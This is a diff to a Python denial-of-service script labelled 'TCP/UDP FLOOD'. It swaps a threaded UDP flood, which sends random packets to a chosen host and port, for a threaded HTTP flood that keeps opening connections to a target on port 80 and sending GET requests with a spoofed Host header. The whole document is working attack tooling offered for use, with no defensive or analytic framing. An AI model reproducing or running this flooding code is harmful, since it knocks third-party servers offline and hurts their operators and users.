@@ -27,20 +27,32 @@ print("###########################")
 print("###### TCP/UDP FLOOD ######")
 print("###########################")
 print()
-ip = str(input(" HOST/IP:=> "))
-port = int(input(" PORT:=> "))
-choice = str(input(" UDP(Y/N):=> "))	
-times = int(input(" PACKETS/Time:=> "))
-threads = int(input(" THREADS/Потоки:=> "))
-def run():
-	data = random._urandom(1024)
-	i = random.choice(("[*]","[!]","[#]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-			print(i +" ATTACK!!!")
-		except:
-			print("[!] ATTACK!!!")
+
+tprint("DK6", font="roman")
+
+awnser_target = input(" Target/URL:=> ")
+awnser_fakeip = input(" HOST/IP:=> ")
+awnser_threads =input(" THREADS/Потоки:=> ")
+
+target = awnser_target
+port = 80
+fake_ip = awnser_fakeip
+
+attack_num = 0
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        
+        global attack_num
+        attack_num += 1
+        print(attack_num)
+        
+        s.close()
+
+for i in range(int(awnser_threads)):
+    thread = threading.Thread(target=attack)
+    thread.start()
